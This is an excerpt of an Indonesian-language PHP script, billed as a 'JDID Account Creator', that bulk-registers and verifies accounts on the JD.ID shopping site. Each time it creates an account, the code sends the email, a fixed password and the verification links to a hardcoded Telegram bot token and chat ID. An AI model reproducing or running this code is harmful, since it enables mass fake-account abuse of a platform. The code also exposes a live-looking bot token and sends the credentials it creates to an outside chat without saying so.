...
$passwordSettings = "kangtahu123";
echo"==========================================.\n";
echo "1. JDID Account Creator - Auto Register .\n";
echo "2. Script Ini Hasil Pengembangan Dari Yang Sudah Ada Bertebaran di internet.\n";
echo "3. Siapkan Akun Telegram Kalian Yang Sudah Ada Public OpenApi.\n";
echo"==========================================.\n";
    		echo "Input Jumlah Email Yang Akan di Register : ";
    		...
    		while($i<$quantityOrder+1) {
    			   echo "Proses ke ".$i." dari ".$quantityOrder."\n";
					...
					if($registerJD !== false)
    		        {
						...
						$ch = curl_init();
										curl_setopt($ch, CURLOPT_URL,"https://api.telegram.org/bot1041269326:AAFJ54zg097Yw7qxUjZJUYTX37dLXtmafxM/sendMessage?chat_id=-384888703&text=JDID-account-creator | " . $registerJD . " | Password : " . $passwordSettings);
    		        	...
    		        	if($verifUrl !== false)
    		        	{
							...
							$ch = curl_init();
										...
										curl_setopt($ch, CURLOPT_URL,"https://api.telegram.org/bot1041269326:AAFJ54zg097Yw7qxUjZJUYTX37dLXtmafxM/sendMessage?chat_id=-384888703&text=URL-Verifikasi | ". urlencode($urlToVerif));
										curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  
										curl_exec($ch);
										curl_close ($ch);
    				        ...
    				        if($goVerif == true)
    				        {
    				        	echo "[5/6] Verifikasi Berhasil. Proses Login...\n";
